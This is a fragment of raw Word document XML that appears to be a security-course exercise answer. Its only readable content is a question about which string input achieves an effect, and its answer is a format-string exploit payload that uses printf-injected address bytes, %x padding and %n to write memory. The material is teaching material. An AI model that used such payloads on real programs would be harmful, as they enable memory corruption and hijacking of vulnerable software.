      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
          <w:w w:val="116"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wo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ld</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6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h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ieve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="104"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E07C8B" w:rsidRPr="00E07C8B" w:rsidRDefault="00E07C8B">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:b/>
          <w:w w:val="104"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
        <w:t>The string input to achieve this would be “</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> “</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x9</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>4\</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x9</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>7\</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x0</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\x08</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>31</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x.%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>31</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x.%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>31</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07C8B">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x.%n”</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00E07C8B" w:rsidRPr="00E07C8B">
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="880" w:right="740" w:bottom="280" w:left="760" w:header="0" w:footer="9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579" w:rsidRDefault="003F5579">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="003F5579" w:rsidRDefault="003F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1FA" w:rsidRDefault="003F5579">
    <w:pPr>
      <w:spacing w:line="180" w:lineRule="exact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5.75pt;margin-top:730.25pt;width:15.3pt;height:13.05pt;z-index:-251658752;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" filled="f" stroked="f">
          <v:textbox style="mso-next-textbox:#_x0000_s2049" inset="0,0,0,0">
            <w:txbxContent>
              <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C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15887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579" w:rsidRDefault="003F5579">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="003F5579" w:rsidRDefault="003F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3D5A44"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="36BE93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FA"/>
    <w:rsid w:val="00083ABC"/>
    <w:rsid w:val="001326CD"/>
    <w:rsid w:val="0019787E"/>
    <w:rsid w:val="00373362"/>
    <w:rsid w:val="003737DD"/>
    <w:rsid w:val="003C181A"/>
    <w:rsid w:val="003F01FA"/>
    <w:rsid w:val="003F5579"/>
    <w:rsid w:val="004B309E"/>
    <w:rsid w:val="004E4108"/>
    <w:rsid w:val="00504F7B"/>
    <w:rsid w:val="00537A8C"/>
    <w:rsid w:val="00621703"/>
    <w:rsid w:val="006769F0"/>
    <w:rsid w:val="007A6E5C"/>
    <w:rsid w:val="00893EAE"/>
    <w:rsid w:val="00901EA1"/>
    <w:rsid w:val="0095026F"/>
    <w:rsid w:val="009F0934"/>
    <w:rsid w:val="00AE7588"/>
    <w:rsid w:val="00B01256"/>
    <w:rsid w:val="00CB07B4"/>
    <w:rsid w:val="00D75B41"/>
    <w:rsid w:val="00E07C8B"/>
    <w:rsid w:val="00E1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3CE48C0-4DEC-4451-8237-9D8F002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41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T. Bair</dc:creator>
  <cp:lastModifiedBy>maryjoyce</cp:lastModifiedBy>
  <cp:revision>11</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-12-17T00:52:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2015-12-17T02:58:00Z</dcterms:modified>
</cp:coreProperties>
</file>